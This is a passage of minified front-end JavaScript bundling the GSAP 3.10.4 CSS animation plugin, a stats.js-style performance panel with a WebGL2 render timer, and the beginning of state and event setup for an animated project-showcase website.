	Bn.version = bn.version = Jn.version = "3.10.4", Vt = 1, Fe() && ln(), cn.Power0, cn.Power1, cn.Power2, cn.Power3, cn.Power4, cn.Linear, cn.Quad, cn.Cubic, cn.Quart, cn.Quint, cn.Strong, cn.Elastic, cn.Back, cn.SteppedEase, cn.Bounce, cn.Sine, cn.Expo, cn.Circ;
	var tr, er, ir, nr, rr, sr, or, ar = {},
		ur = 180 / Math.PI,
		hr = Math.PI / 180,
		lr = Math.atan2,
		cr = /([A-Z])/g,
		dr = /(left|right|width|margin|padding|x)/i,
		pr = /[\s,\(]\S/,
		fr = {
			autoAlpha: "opacity,visibility",
			scale: "scaleX,scaleY",
			alpha: "opacity"
		},
		mr = function(t, e) {
			return e.set(e.t, e.p, Math.round(1e4 * (e.s + e.c * t)) / 1e4 + e.u, e)
		},
		gr = function(t, e) {
			return e.set(e.t, e.p, 1 === t ? e.e : Math.round(1e4 * (e.s + e.c * t)) / 1e4 + e.u, e)
		},
		vr = function(t, e) {
			return e.set(e.t, e.p, t ? Math.round(1e4 * (e.s + e.c * t)) / 1e4 + e.u : e.b, e)
		},
		_r = function(t, e) {
			var i = e.s + e.c * t;
			e.set(e.t, e.p, ~~(i + (i < 0 ? -.5 : .5)) + e.u, e)
		},
		Dr = function(t, e) {
			return e.set(e.t, e.p, t ? e.e : e.b, e)
		},
		yr = function(t, e) {
			return e.set(e.t, e.p, 1 !== t ? e.b : e.e, e)
		},
		xr = function(t, e, i) {
			return t.style[e] = i
		},
		wr = function(t, e, i) {
			return t.style.setProperty(e, i)
		},
		Er = function(t, e, i) {
			return t._gsap[e] = i
		},
		br = function(t, e, i) {
			return t._gsap.scaleX = t._gsap.scaleY = i
		},
		Cr = function(t, e, i, n, r) {
			var s = t._gsap;
			s.scaleX = s.scaleY = i, s.renderTransform(r, s)
		},
		Tr = function(t, e, i, n, r) {
			var s = t._gsap;
			s[e] = i, s.renderTransform(r, s)
		},
		Fr = "transform",
		Mr = Fr + "Origin",
		Ar = function(t, e) {
			var i = er.createElementNS ? er.createElementNS((e || "http://www.w3.org/1999/xhtml").replace(/^https/, "http"), t) : er.createElement(t);
			return i.style ? i : er.createElement(t)
		},
		Sr = function t(e, i, n) {
			var r = getComputedStyle(e);
			return r[i] || r.getPropertyValue(i.replace(cr, "-$1").toLowerCase()) || r.getPropertyValue(i) || !n && t(e, Pr(i) || i, 1) || ""
		},
		Or = "O,Moz,ms,Ms,Webkit".split(","),
		Pr = function(t, e, i) {
			var n = (e || rr).style,
				r = 5;
			if (t in n && !i) return t;
			for (t = t.charAt(0).toUpperCase() + t.substr(1); r-- && !(Or[r] + t in n););
			return r < 0 ? null : (3 === r ? "ms" : r >= 0 ? Or[r] : "") + t
		},
		Ir = function() {
			"undefined" != typeof window && window.document && (tr = window, er = tr.document, ir = er.documentElement, rr = Ar("div") || {
				style: {}
			}, Ar("div"), Fr = Pr(Fr), Mr = Fr + "Origin", rr.style.cssText = "border-width:0;line-height:0;position:absolute;padding:0", or = !!Pr("perspective"), nr = 1)
		},
		Lr = function t(e) {
			var i, n = Ar("svg", this.ownerSVGElement && this.ownerSVGElement.getAttribute("xmlns") || "http://www.w3.org/2000/svg"),
				r = this.parentNode,
				s = this.nextSibling,
				o = this.style.cssText;
			if (ir.appendChild(n), n.appendChild(this), this.style.display = "block", e) try {
				i = this.getBBox(), this._gsapBBox = this.getBBox, this.getBBox = t
			} catch (t) {} else this._gsapBBox && (i = this._gsapBBox());
			return r && (s ? r.insertBefore(this, s) : r.appendChild(this)), ir.removeChild(n), this.style.cssText = o, i
		},
		Br = function(t, e) {
			for (var i = e.length; i--;)
				if (t.hasAttribute(e[i])) return t.getAttribute(e[i])
		},
		kr = function(t) {
			var e;
			try {
				e = t.getBBox()
			} catch (i) {
				e = Lr.call(t, !0)
			}
			return e && (e.width || e.height) || t.getBBox === Lr || (e = Lr.call(t, !0)), !e || e.width || e.x || e.y ? e : {
				x: +Br(t, ["x", "cx", "x1"]) || 0,
				y: +Br(t, ["y", "cy", "y1"]) || 0,
				width: 0,
				height: 0
			}
		},
		Rr = function(t) {
			return !(!t.getCTM || t.parentNode && !t.ownerSVGElement || !kr(t))
		},
		Nr = function(t, e) {
			if (e) {
				var i = t.style;
				e in ar && e !== Mr && (e = Fr), i.removeProperty ? ("ms" !== e.substr(0, 2) && "webkit" !== e.substr(0, 6) || (e = "-" + e), i.removeProperty(e.replace(cr, "-$1").toLowerCase())) : i.removeAttribute(e)
			}
		},
		Wr = function(t, e, i, n, r, s) {
			var o = new $n(t._pt, e, i, 0, 1, s ? yr : Dr);
			return t._pt = o, o.b = n, o.e = r, t._props.push(i), o
		},
		zr = {
			deg: 1,
			rad: 1,
			turn: 1
		},
		Ur = function t(e, i, n, r) {
			var s, o, a, u, h = parseFloat(n) || 0,
				l = (n + "").trim().substr((h + "").length) || "px",
				c = rr.style,
				d = dr.test(i),
				p = "svg" === e.tagName.toLowerCase(),
				f = (p ? "client" : "offset") + (d ? "Width" : "Height"),
				m = "px" === r,
				g = "%" === r;
			return r === l || !h || zr[r] || zr[l] ? h : ("px" !== l && !m && (h = t(e, i, n, "px")), u = e.getCTM && Rr(e), !g && "%" !== l || !ar[i] && !~i.indexOf("adius") ? (c[d ? "width" : "height"] = 100 + (m ? l : r), o = ~i.indexOf("adius") || "em" === r && e.appendChild && !p ? e : e.parentNode, u && (o = (e.ownerSVGElement || {}).parentNode), o && o !== er && o.appendChild || (o = er.body), (a = o._gsap) && g && a.width && d && a.time === hn.time ? ni(h / a.width * 100) : ((g || "%" === l) && (c.position = Sr(e, "position")), o === e && (c.position = "static"), o.appendChild(rr), s = rr[f], o.removeChild(rr), c.position = "absolute", d && g && ((a = ti(o)).time = hn.time, a.width = o[f]), ni(m ? s * h / 100 : s && h ? 100 / s * h : 0))) : (s = u ? e.getBBox()[d ? "width" : "height"] : e[f], ni(g ? h / s * 100 : h / 100 * s)))
		},
		jr = function(t, e, i, n) {
			var r;
			return nr || Ir(), e in fr && "transform" !== e && ~(e = fr[e]).indexOf(",") && (e = e.split(",")[0]), ar[e] && "transform" !== e ? (r = Jr(t, n), r = "transformOrigin" !== e ? r[e] : r.svg ? r.origin : ts(Sr(t, Mr)) + " " + r.zOrigin + "px") : (!(r = t.style[e]) || "auto" === r || n || ~(r + "").indexOf("calc(")) && (r = qr[e] && qr[e](t, e, i) || Sr(t, e) || ei(t, e) || ("opacity" === e ? 1 : 0)), i && !~(r + "").trim().indexOf(" ") ? Ur(t, e, r, i) + i : r
		},
		Vr = function(t, e, i, n) {
			if (!i || "none" === i) {
				var r = Pr(e, t, 1),
					s = r && Sr(t, r, 1);
				s && s !== i ? (e = r, i = s) : "borderColor" === e && (i = Sr(t, "borderTopColor"))
			}
			var o, a, u, h, l, c, d, p, f, m, g, v = new $n(this._pt, t.style, e, 0, 1, Vn),
				_ = 0,
				D = 0;
			if (v.b = i, v.e = n, i += "", "auto" == (n += "") && (t.style[e] = n, n = Sr(t, e) || n, t.style[e] = i), un(o = [i, n]), n = o[1], u = (i = o[0]).match(Ie) || [], (n.match(Ie) || []).length) {
				for (; a = Ie.exec(n);) d = a[0], f = n.substring(_, a.index), l ? l = (l + 1) % 5 : "rgba(" !== f.substr(-5) && "hsla(" !== f.substr(-5) || (l = 1), d !== (c = u[D++] || "") && (h = parseFloat(c) || 0, g = c.substr((h + "").length), "=" === d.charAt(1) && (d = si(h, d) + g), p = parseFloat(d), m = d.substr((p + "").length), _ = Ie.lastIndex - m.length, m || (m = m || de.units[e] || g, _ === n.length && (n += m, v.e += m)), g !== m && (h = Ur(t, e, c, m) || 0), v._pt = {
					_next: v._pt,
					p: f || 1 === D ? f : ",",
					s: h,
					c: p - h,
					m: l && l < 4 || "zIndex" === e ? Math.round : 0
				});
				v.c = _ < n.length ? n.substring(_, n.length) : ""
			} else v.r = "display" === e && "none" === n ? yr : Dr;
			return Be.test(n) && (v.e = 0), this._pt = v, v
		},
		Gr = {
			top: "0%",
			bottom: "100%",
			left: "0%",
			right: "100%",
			center: "50%"
		},
		Hr = function(t, e) {
			if (e.tween && e.tween._time === e.tween._dur) {
				var i, n, r, s = e.t,
					o = s.style,
					a = e.u,
					u = s._gsap;
				if ("all" === a || !0 === a) o.cssText = "", n = 1;
				else
					for (r = (a = a.split(",")).length; --r > -1;) i = a[r], ar[i] && (n = 1, i = "transformOrigin" === i ? Mr : Fr), Nr(s, i);
				n && (Nr(s, Fr), u && (u.svg && s.removeAttribute("transform"), Jr(s, 1), u.uncache = 1))
			}
		},
		qr = {
			clearProps: function(t, e, i, n, r) {
				if ("isFromStart" !== r.data) {
					var s = t._pt = new $n(t._pt, e, i, 0, 0, Hr);
					return s.u = n, s.pr = -10, s.tween = r, t._props.push(i), 1
				}
			}
		},
		Yr = [1, 0, 0, 1, 0, 0],
		Xr = {},
		$r = function(t) {
			return "matrix(1, 0, 0, 1, 0, 0)" === t || "none" === t || !t
		},
		Zr = function(t) {
			var e = Sr(t, Fr);
			return $r(e) ? Yr : e.substr(7).match(Pe).map(ni)
		},
		Kr = function(t, e) {
			var i, n, r, s, o = t._gsap || ti(t),
				a = t.style,
				u = Zr(t);
			return o.svg && t.getAttribute("transform") ? "1,0,0,1,0,0" === (u = [(r = t.transform.baseVal.consolidate().matrix).a, r.b, r.c, r.d, r.e, r.f]).join(",") ? Yr : u : (u !== Yr || t.offsetParent || t === ir || o.svg || (r = a.display, a.display = "block", (i = t.parentNode) && t.offsetParent || (s = 1, n = t.nextSibling, ir.appendChild(t)), u = Zr(t), r ? a.display = r : Nr(t, "display"), s && (n ? i.insertBefore(t, n) : i ? i.appendChild(t) : ir.removeChild(t))), e && u.length > 6 ? [u[0], u[1], u[4], u[5], u[12], u[13]] : u)
		},
		Qr = function(t, e, i, n, r, s) {
			var o, a, u, h = t._gsap,
				l = r || Kr(t, !0),
				c = h.xOrigin || 0,
				d = h.yOrigin || 0,
				p = h.xOffset || 0,
				f = h.yOffset || 0,
				m = l[0],
				g = l[1],
				v = l[2],
				_ = l[3],
				D = l[4],
				y = l[5],
				x = e.split(" "),
				w = parseFloat(x[0]) || 0,
				E = parseFloat(x[1]) || 0;
			i ? l !== Yr && (a = m * _ - g * v) && (u = w * (-g / a) + E * (m / a) - (m * y - g * D) / a, w = w * (_ / a) + E * (-v / a) + (v * y - _ * D) / a, E = u) : (w = (o = kr(t)).x + (~x[0].indexOf("%") ? w / 100 * o.width : w), E = o.y + (~(x[1] || x[0]).indexOf("%") ? E / 100 * o.height : E)), n || !1 !== n && h.smooth ? (D = w - c, y = E - d, h.xOffset = p + (D * m + y * v) - D, h.yOffset = f + (D * g + y * _) - y) : h.xOffset = h.yOffset = 0, h.xOrigin = w, h.yOrigin = E, h.smooth = !!n, h.origin = e, h.originIsAbsolute = !!i, t.style[Mr] = "0px 0px", s && (Wr(s, h, "xOrigin", c, w), Wr(s, h, "yOrigin", d, E), Wr(s, h, "xOffset", p, h.xOffset), Wr(s, h, "yOffset", f, h.yOffset)), t.setAttribute("data-svg-origin", w + " " + E)
		},
		Jr = function(t, e) {
			var i = t._gsap || new wn(t);
			if ("x" in i && !e && !i.uncache) return i;
			var n, r, s, o, a, u, h, l, c, d, p, f, m, g, v, _, D, y, x, w, E, b, C, T, F, M, A, S, O, P, I, L, B = t.style,
				k = i.scaleX < 0,
				R = Sr(t, Mr) || "0";
			return n = r = s = u = h = l = c = d = p = 0, o = a = 1, i.svg = !(!t.getCTM || !Rr(t)), g = Kr(t, i.svg), i.svg && (T = (!i.uncache || "0px 0px" === R) && !e && t.getAttribute("data-svg-origin"), Qr(t, T || R, !!T || i.originIsAbsolute, !1 !== i.smooth, g)), f = i.xOrigin || 0, m = i.yOrigin || 0, g !== Yr && (y = g[0], x = g[1], w = g[2], E = g[3], n = b = g[4], r = C = g[5], 6 === g.length ? (o = Math.sqrt(y * y + x * x), a = Math.sqrt(E * E + w * w), u = y || x ? lr(x, y) * ur : 0, (c = w || E ? lr(w, E) * ur + u : 0) && (a *= Math.abs(Math.cos(c * hr))), i.svg && (n -= f - (f * y + m * w), r -= m - (f * x + m * E))) : (L = g[6], P = g[7], A = g[8], S = g[9], O = g[10], I = g[11], n = g[12], r = g[13], s = g[14], h = (v = lr(L, O)) * ur, v && (T = b * (_ = Math.cos(-v)) + A * (D = Math.sin(-v)), F = C * _ + S * D, M = L * _ + O * D, A = b * -D + A * _, S = C * -D + S * _, O = L * -D + O * _, I = P * -D + I * _, b = T, C = F, L = M), l = (v = lr(-w, O)) * ur, v && (_ = Math.cos(-v), I = E * (D = Math.sin(-v)) + I * _, y = T = y * _ - A * D, x = F = x * _ - S * D, w = M = w * _ - O * D), u = (v = lr(x, y)) * ur, v && (T = y * (_ = Math.cos(v)) + x * (D = Math.sin(v)), F = b * _ + C * D, x = x * _ - y * D, C = C * _ - b * D, y = T, b = F), h && Math.abs(h) + Math.abs(u) > 359.9 && (h = u = 0, l = 180 - l), o = ni(Math.sqrt(y * y + x * x + w * w)), a = ni(Math.sqrt(C * C + L * L)), v = lr(b, C), c = Math.abs(v) > 2e-4 ? v * ur : 0, p = I ? 1 / (I < 0 ? -I : I) : 0), i.svg && (T = t.getAttribute("transform"), i.forceCSS = t.setAttribute("transform", "") || !$r(Sr(t, Fr)), T && t.setAttribute("transform", T))), Math.abs(c) > 90 && Math.abs(c) < 270 && (k ? (o *= -1, c += u <= 0 ? 180 : -180, u += u <= 0 ? 180 : -180) : (a *= -1, c += c <= 0 ? 180 : -180)), e = e || i.uncache, i.x = n - ((i.xPercent = n && (!e && i.xPercent || (Math.round(t.offsetWidth / 2) === Math.round(-n) ? -50 : 0))) ? t.offsetWidth * i.xPercent / 100 : 0) + "px", i.y = r - ((i.yPercent = r && (!e && i.yPercent || (Math.round(t.offsetHeight / 2) === Math.round(-r) ? -50 : 0))) ? t.offsetHeight * i.yPercent / 100 : 0) + "px", i.z = s + "px", i.scaleX = ni(o), i.scaleY = ni(a), i.rotation = ni(u) + "deg", i.rotationX = ni(h) + "deg", i.rotationY = ni(l) + "deg", i.skewX = c + "deg", i.skewY = d + "deg", i.transformPerspective = p + "px", (i.zOrigin = parseFloat(R.split(" ")[2]) || 0) && (B[Mr] = ts(R)), i.xOffset = i.yOffset = 0, i.force3D = de.force3D, i.renderTransform = i.svg ? rs : or ? ns : is, i.uncache = 0, i
		},
		ts = function(t) {
			return (t = t.split(" "))[0] + " " + t[1]
		},
		es = function(t, e, i) {
			var n = Ni(e);
			return ni(parseFloat(e) + parseFloat(Ur(t, "x", i + "px", n))) + n
		},
		is = function(t, e) {
			e.z = "0px", e.rotationY = e.rotationX = "0deg", e.force3D = 0, ns(t, e)
		},
		ns = function(t, e) {
			var i = e || this,
				n = i.xPercent,
				r = i.yPercent,
				s = i.x,
				o = i.y,
				a = i.z,
				u = i.rotation,
				h = i.rotationY,
				l = i.rotationX,
				c = i.skewX,
				d = i.skewY,
				p = i.scaleX,
				f = i.scaleY,
				m = i.transformPerspective,
				g = i.force3D,
				v = i.target,
				_ = i.zOrigin,
				D = "",
				y = "auto" === g && t && 1 !== t || !0 === g;
			if (_ && ("0deg" !== l || "0deg" !== h)) {
				var x, w = parseFloat(h) * hr,
					E = Math.sin(w),
					b = Math.cos(w);
				w = parseFloat(l) * hr, x = Math.cos(w), s = es(v, s, E * x * -_), o = es(v, o, -Math.sin(w) * -_), a = es(v, a, b * x * -_ + _)
			}
			"0px" !== m && (D += "perspective(" + m + ") "), (n || r) && (D += "translate(" + n + "%, " + r + "%) "), (y || "0px" !== s || "0px" !== o || "0px" !== a) && (D += "0px" !== a || y ? "translate3d(" + s + ", " + o + ", " + a + ") " : "translate(" + s + ", " + o + ") "), "0deg" !== u && (D += "rotate(" + u + ") "), "0deg" !== h && (D += "rotateY(" + h + ") "), "0deg" !== l && (D += "rotateX(" + l + ") "), "0deg" === c && "0deg" === d || (D += "skew(" + c + ", " + d + ") "), 1 === p && 1 === f || (D += "scale(" + p + ", " + f + ") "), v.style[Fr] = D || "translate(0, 0)"
		},
		rs = function(t, e) {
			var i, n, r, s, o, a = e || this,
				u = a.xPercent,
				h = a.yPercent,
				l = a.x,
				c = a.y,
				d = a.rotation,
				p = a.skewX,
				f = a.skewY,
				m = a.scaleX,
				g = a.scaleY,
				v = a.target,
				_ = a.xOrigin,
				D = a.yOrigin,
				y = a.xOffset,
				x = a.yOffset,
				w = a.forceCSS,
				E = parseFloat(l),
				b = parseFloat(c);
			d = parseFloat(d), p = parseFloat(p), (f = parseFloat(f)) && (p += f = parseFloat(f), d += f), d || p ? (d *= hr, p *= hr, i = Math.cos(d) * m, n = Math.sin(d) * m, r = Math.sin(d - p) * -g, s = Math.cos(d - p) * g, p && (f *= hr, o = Math.tan(p - f), r *= o = Math.sqrt(1 + o * o), s *= o, f && (o = Math.tan(f), i *= o = Math.sqrt(1 + o * o), n *= o)), i = ni(i), n = ni(n), r = ni(r), s = ni(s)) : (i = m, s = g, n = r = 0), (E && !~(l + "").indexOf("px") || b && !~(c + "").indexOf("px")) && (E = Ur(v, "x", l, "px"), b = Ur(v, "y", c, "px")), (_ || D || y || x) && (E = ni(E + _ - (_ * i + D * r) + y), b = ni(b + D - (_ * n + D * s) + x)), (u || h) && (o = v.getBBox(), E = ni(E + u / 100 * o.width), b = ni(b + h / 100 * o.height)), o = "matrix(" + i + "," + n + "," + r + "," + s + "," + E + "," + b + ")", v.setAttribute("transform", o), w && (v.style[Fr] = o)
		},
		ss = function(t, e, i, n, r) {
			var s, o, a = xe(r),
				u = parseFloat(r) * (a && ~r.indexOf("rad") ? ur : 1) - n,
				h = n + u + "deg";
			return a && ("short" === (s = r.split("_")[1]) && (u %= 360) != u % 180 && (u += u < 0 ? 360 : -360), "cw" === s && u < 0 ? u = (u + 36e9) % 360 - 360 * ~~(u / 360) : "ccw" === s && u > 0 && (u = (u - 36e9) % 360 - 360 * ~~(u / 360))), t._pt = o = new $n(t._pt, e, i, n, u, gr), o.e = h, o.u = "deg", t._props.push(i), o
		},
		os = function(t, e) {
			for (var i in e) t[i] = e[i];
			return t
		},
		as = function(t, e, i) {
			var n, r, s, o, a, u, h, l = os({}, i._gsap),
				c = i.style;
			for (r in l.svg ? (s = i.getAttribute("transform"), i.setAttribute("transform", ""), c[Fr] = e, n = Jr(i, 1), Nr(i, Fr), i.setAttribute("transform", s)) : (s = getComputedStyle(i)[Fr], c[Fr] = e, n = Jr(i, 1), c[Fr] = s), ar)(s = l[r]) !== (o = n[r]) && "perspective,force3D,transformOrigin,svgOrigin".indexOf(r) < 0 && (a = Ni(s) !== (h = Ni(o)) ? Ur(i, r, s, h) : parseFloat(s), u = parseFloat(o), t._pt = new $n(t._pt, n, r, a, u - a, mr), t._pt.u = h || 0, t._props.push(r));
			os(n, l)
		};
	ii("padding,margin,Width,Radius", (function(t, e) {
		var i = "Top",
			n = "Right",
			r = "Bottom",
			s = "Left",
			o = (e < 3 ? [i, n, r, s] : [i + s, i + n, r + n, r + s]).map((function(i) {
				return e < 2 ? t + i : "border" + i + t
			}));
		qr[e > 1 ? "border" + t : t] = function(t, e, i, n, r) {
			var s, a;
			if (arguments.length < 4) return s = o.map((function(e) {
				return jr(t, e, i)
			})), 5 === (a = s.join(" ")).split(s[0]).length ? s[0] : a;
			s = (n + "").split(" "), a = {}, o.forEach((function(t, e) {
				return a[t] = s[e] = s[e] || s[(e - 1) / 2 | 0]
			})), t.init(e, a, r)
		}
	}));
	var us, hs, ls = {
		name: "css",
		register: Ir,
		targetTest: function(t) {
			return t.style && t.nodeType
		},
		init: function(t, e, i, n, r) {
			var s, o, a, u, h, l, c, d, p, f, m, g, v, _, D, y, x, w, E, b = this._props,
				C = t.style,
				T = i.vars.startAt;
			for (c in nr || Ir(), e)
				if ("autoRound" !== c && (o = e[c], !Xe[c] || !An(c, e, i, n, t, r)))
					if (h = typeof o, l = qr[c], "function" === h && (h = typeof(o = o.call(i, n, t, r))), "string" === h && ~o.indexOf("random(") && (o = Xi(o)), l) l(this, t, c, o, i) && (D = 1);
					else if ("--" === c.substr(0, 2)) s = (getComputedStyle(t).getPropertyValue(c) + "").trim(), o += "", on.lastIndex = 0, on.test(s) || (d = Ni(s), p = Ni(o)), p ? d !== p && (s = Ur(t, c, s, p) + p) : d && (o += d), this.add(C, "setProperty", s, o, n, r, 0, 0, c), b.push(c);
			else if ("undefined" !== h) {
				if (T && c in T ? (s = "function" == typeof T[c] ? T[c].call(i, n, t, r) : T[c], xe(s) && ~s.indexOf("random(") && (s = Xi(s)), Ni(s + "") || (s += de.units[c] || Ni(jr(t, c)) || ""), "=" === (s + "").charAt(1) && (s = jr(t, c))) : s = jr(t, c), u = parseFloat(s), (f = "string" === h && "=" === o.charAt(1) && o.substr(0, 2)) && (o = o.substr(2)), a = parseFloat(o), c in fr && ("autoAlpha" === c && (1 === u && "hidden" === jr(t, "visibility") && a && (u = 0), Wr(this, C, "visibility", u ? "inherit" : "hidden", a ? "inherit" : "hidden", !a)), "scale" !== c && "transform" !== c && ~(c = fr[c]).indexOf(",") && (c = c.split(",")[0])), m = c in ar)
					if (g || ((v = t._gsap).renderTransform && !e.parseTransform || Jr(t, e.parseTransform), _ = !1 !== e.smoothOrigin && v.smooth, (g = this._pt = new $n(this._pt, C, Fr, 0, 1, v.renderTransform, v, 0, -1)).dep = 1), "scale" === c) this._pt = new $n(this._pt, v, "scaleY", v.scaleY, (f ? si(v.scaleY, f + a) : a) - v.scaleY || 0), b.push("scaleY", c), c += "X";
					else {
						if ("transformOrigin" === c) {
							x = void 0, w = void 0, E = void 0, w = (x = (y = o).split(" "))[0], E = x[1] || "50%", "top" !== w && "bottom" !== w && "left" !== E && "right" !== E || (y = w, w = E, E = y), x[0] = Gr[w] || w, x[1] = Gr[E] || E, o = x.join(" "), v.svg ? Qr(t, o, 0, _, 0, this) : ((p = parseFloat(o.split(" ")[2]) || 0) !== v.zOrigin && Wr(this, v, "zOrigin", v.zOrigin, p), Wr(this, C, c, ts(s), ts(o)));
							continue
						}
						if ("svgOrigin" === c) {
							Qr(t, o, 1, _, 0, this);
							continue
						}
						if (c in Xr) {
							ss(this, v, c, u, f ? si(u, f + o) : o);
							continue
						}
						if ("smoothOrigin" === c) {
							Wr(this, v, "smooth", v.smooth, o);
							continue
						}
						if ("force3D" === c) {
							v[c] = o;
							continue
						}
						if ("transform" === c) {
							as(this, o, t);
							continue
						}
					}
				else c in C || (c = Pr(c) || c);
				if (m || (a || 0 === a) && (u || 0 === u) && !pr.test(o) && c in C) a || (a = 0), (d = (s + "").substr((u + "").length)) !== (p = Ni(o) || (c in de.units ? de.units[c] : d)) && (u = Ur(t, c, s, p)), this._pt = new $n(this._pt, m ? v : C, c, u, (f ? si(u, f + a) : a) - u, m || "px" !== p && "zIndex" !== c || !1 === e.autoRound ? mr : _r), this._pt.u = p || 0, d !== p && "%" !== p && (this._pt.b = s, this._pt.r = vr);
				else if (c in C) Vr.call(this, t, c, s, f ? f + o : o);
				else {
					if (!(c in t)) {
						Ue(c, o);
						continue
					}
					this.add(t, c, s || t[c], f ? f + o : o, n, r)
				}
				b.push(c)
			}
			D && Xn(this)
		},
		get: jr,
		aliases: fr,
		getSetter: function(t, e, i) {
			var n = fr[e];
			return n && n.indexOf(",") < 0 && (e = n), e in ar && e !== Mr && (t._gsap.x || jr(t, "x")) ? i && sr === i ? "scale" === e ? br : Er : (sr = i || {}) && ("scale" === e ? Cr : Tr) : t.style && !be(t.style[e]) ? xr : ~e.indexOf("-") ? wr : zn(t, e)
		},
		core: {
			_removeProperty: Nr,
			_getMatrix: Kr
		}
	};
	Jn.utils.checkPrefix = Pr, hs = ii("x,y,z,scale,scaleX,scaleY,xPercent,yPercent," + (us = "rotation,rotationX,rotationY,skewX,skewY") + ",transform,transformOrigin,svgOrigin,force3D,smoothOrigin,transformPerspective", (function(t) {
		ar[t] = 1
	})), ii(us, (function(t) {
		de.units[t] = "deg", Xr[t] = 1
	})), fr[hs[13]] = "x,y,z,scale,scaleX,scaleY,xPercent,yPercent," + us, ii("0:translateX,1:translateY,2:translateZ,8:rotate,8:rotationZ,8:rotateZ,9:rotateX,10:rotateY", (function(t) {
		var e = t.split(":");
		fr[e[1]] = hs[e[0]]
	})), ii("x,y,z,top,right,bottom,left,width,height,fontSize,padding,margin,perspective", (function(t) {
		de.units[t] = "px"
	})), Jn.registerPlugin(ls);
	var cs = Jn.registerPlugin(ls) || Jn,
		ds = (cs.core.Tween, i(14)),
		ps = i.n(ds).a,
		fs = {
			WINDOW_WIDTH: window.innerWidth,
			WINDOW_HEIGHT: window.innerHeight,
			WINDOW_RATIO: window.innerWidth / window.innerHeight,
			appeared: null,
			isFirstPage: !0,
			IS_MOBILE: window.innerWidth <= 992,
			SLIDER_MOBILE_THUMB_WIDTH: 64,
			SLIDER_MOBILE_THUMB_GAP: 16,
			projects: [],
			currentProject: null,
			media: {},
			dom: {
				navBar: null,
				navBarLogoBL: null,
				navBarOpenerBL: null,
				navBarOpener: null
			}
		},
		ms = i(15),
		gs = "WINDOW_RESIZE",
		vs = "SLIDER_NAVIGATE_IN",
		_s = "GL_APPEAR_PROJECT",
		Ds = "GL_TO_PROJECT",
		ys = "GL_OUT_PROJECT",
		xs = "GL_TO_INDEX",
		ws = "GL_OUT_INDEX",
		Es = "LOADER_LOADED",
		bs = i.n(ms)()(.34, .52, 0, 1),
		Cs = function t() {
			var e = 0,
				i = document.createElement("div");

			function n(t) {
				return i.appendChild(t.dom), t
			}

			function r(t) {
				for (var n = 0; n < i.children.length; n++) i.children[n].style.display = n === t ? "block" : "none";
				e = t
			}
			i.style.cssText = "position:fixed;top:0;left:0;cursor:pointer;opacity:0.9;z-index:10000", i.addEventListener("click", (function(t) {
				t.preventDefault(), r(++e % i.children.length)
			}), !1);
			var s = (performance || Date).now(),
				o = s,
				a = 0,
				u = n(new t.Panel("FPS", "#0ff", "#002")),
				h = n(new t.Panel("MS", "#0f0", "#020"));
			if (self.performance && self.performance.memory) var l = n(new t.Panel("MB", "#f08", "#201"));
			return r(0), {
				REVISION: 16,
				dom: i,
				addPanel: n,
				showPanel: r,
				begin: function() {
					s = (performance || Date).now()
				},
				end: function() {
					a++;
					var t = (performance || Date).now();
					if (h.update(t - s, 200), t >= o + 1e3 && (u.update(1e3 * a / (t - o), 100), o = t, a = 0, l)) {
						var e = performance.memory;
						l.update(e.usedJSHeapSize / 1048576, e.jsHeapSizeLimit / 1048576)
					}
					return t
				},
				update: function() {
					s = this.end()
				},
				domElement: i,
				setMode: r
			}
		};
	Cs.Panel = function(t, e, i) {
		var n = 1 / 0,
			r = 0,
			s = Math.round,
			o = s(window.devicePixelRatio || 1),
			a = 80 * o,
			u = 48 * o,
			h = 3 * o,
			l = 2 * o,
			c = 3 * o,
			d = 15 * o,
			p = 74 * o,
			f = 30 * o,
			m = document.createElement("canvas");
		m.width = a, m.height = u, m.style.cssText = "width:80px;height:48px";
		var g = m.getContext("2d");
		return g.font = "bold " + 9 * o + "px Helvetica,Arial,sans-serif", g.textBaseline = "top", g.fillStyle = i, g.fillRect(0, 0, a, u), g.fillStyle = e, g.fillText(t, h, l), g.fillRect(c, d, p, f), g.fillStyle = i, g.globalAlpha = .9, g.fillRect(c, d, p, f), {
			dom: m,
			update: function(u, v) {
				n = Math.min(n, u), r = Math.max(r, u), g.fillStyle = i, g.globalAlpha = 1, g.fillRect(0, 0, a, d), g.fillStyle = e, g.fillText(s(u) + " " + t + " (" + s(n) + "-" + s(r) + ")", h, l), g.drawImage(m, c + o, d, p - o, f, c, d, p - o, f), g.fillRect(c + p - o, d, o, f), g.fillStyle = i, g.globalAlpha = .9, g.fillRect(c + p - o, d, o, s((1 - u / v) * f))
			}
		}
	};
	var Ts = Cs,
		Fs = function() {
			function t(e) {
				r()(this, t), this.instance = new Ts, this.instance.showPanel(3), this.active = !1, this.max = 40, this.ignoreMaxed = !0, e && this.activate()
			}
			return o()(t, [{
				key: "activate",
				value: function() {
					this.active = !0, document.body.appendChild(this.instance.dom)
				}
			}, {
				key: "deactivate",
				value: function() {
					this.active = !1, document.body.removeChild(this.instance.dom)
				}
			}, {
				key: "setRenderPanel",
				value: function(t) {
					this.render = {}, this.render.context = t, this.render.extension = this.render.context.getExtension("EXT_disjoint_timer_query_webgl2"), this.render.panel = this.instance.addPanel(new Ts.Panel("Render (ms)", "#f8f", "#212")), "undefined" != typeof WebGL2RenderingContext && t instanceof WebGL2RenderingContext && this.render.extension || this.deactivate()
				}
			}, {
				key: "beforeRender",
				value: function() {
					if (this.active) {
						this.queryCreated = !1;
						var t = !1;
						if (this.render.query) {
							t = this.render.context.getQueryParameter(this.render.query, this.render.context.QUERY_RESULT_AVAILABLE);
							var e = this.render.context.getParameter(this.render.extension.GPU_DISJOINT_EXT);
							if (t && !e) {
								var i = this.render.context.getQueryParameter(this.render.query, this.render.context.QUERY_RESULT),
									n = Math.min(i / 1e3 / 1e3, this.max);
								n === this.max && this.ignoreMaxed || this.render.panel.update(n, this.max)
							}
						}!t && this.render.query || (this.queryCreated = !0, this.render.query = this.render.context.createQuery(), this.render.context.beginQuery(this.render.extension.TIME_ELAPSED_EXT, this.render.query))
					}
				}
			}, {
				key: "afterRender",
				value: function() {
					this.active && this.queryCreated && this.render.context.endQuery(this.render.extension.TIME_ELAPSED_EXT)
				}
			}, {
				key: "update",
				value: function() {
					this.active && this.instance.update()
				}
			}, {
				key: "destroy",
				value: function() {
					this.deactivate()
				}
			}]), t
		}(),
		Ms = function() {
			function t() {
				r()(this, t), this.ready = !1, this.started = !1, this.paused = !1, this.onResize = this.onResize.bind(this), this.update = this.update.bind(this)
			}
			var e;
			return o()(t, [{
				key: "stop",
				value: function() {
